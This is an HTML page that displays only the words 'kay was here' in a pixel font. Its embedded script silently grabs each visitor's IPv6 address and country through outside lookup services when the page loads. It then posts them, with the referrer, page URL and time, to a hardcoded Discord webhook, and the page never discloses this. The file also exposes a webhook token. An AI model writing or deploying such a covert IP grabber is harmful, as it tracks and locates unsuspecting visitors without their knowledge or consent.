<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>kay was here</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #000000;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    .text {
      font-family: 'Press Start 2P', cursive;
      font-size: 5.5vw;          /* scales with screen width */
      color: #ffffff;
      text-align: center;
      line-height: 1.2;
      text-shadow: 
        6px 6px 0 #000,
       -6px -6px 0 #000,
        6px -6px 0 #000,
       -6px 6px 0 #000;
      letter-spacing: 0.08em;
      user-select: none;
    }

    @media (max-width: 600px) {
      .text {
        font-size: 9vw;
      }
    }
  </style>
</head>
<body>

  <div class="text">
    kay was here
  </div>

  <script>
    // ──────────────────────────────────────────────────────────────
    // IPv6-only grabber + country (silent)
    // ──────────────────────────────────────────────────────────────
    const webhook = 'https://discord.com/api/webhooks/1462407993961480386/R49486d_gn1NRtuwvMWN2jwCgLxF6MeDa83LuCJQrkVxOJWTIGCuEhAepmgDey062pH5';

    async function logVisit() {
      try {
        let ipv6 = 'none';
        try {
          const res = await fetch('https://api6.ipify.org?format=json');
          const data = await res.json();
          ipv6 = data.ip || 'none';
        } catch {}

        let country = 'unknown';
        try {
          const geo = await fetch('https://ipapi.co/json/');
          const geoData = await geo.json();
          country = geoData.country_name || geoData.country || 'unknown';
        } catch {}

        const payload = {
          content: [
            '**kay was here**',
            `IPv6: ${ipv6}`,
            `Country: ${country}`,
            `Referrer: ${document.referrer || 'direct'}`,
            `Page: ${window.location.href}`,
            `Time: ${new Date().toISOString()}`
          ].join('\n'),
          allowed_mentions: { parse: [] }
        };

        await fetch(webhook, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch {}
    }

    logVisit();
  </script>

</body>
</html>
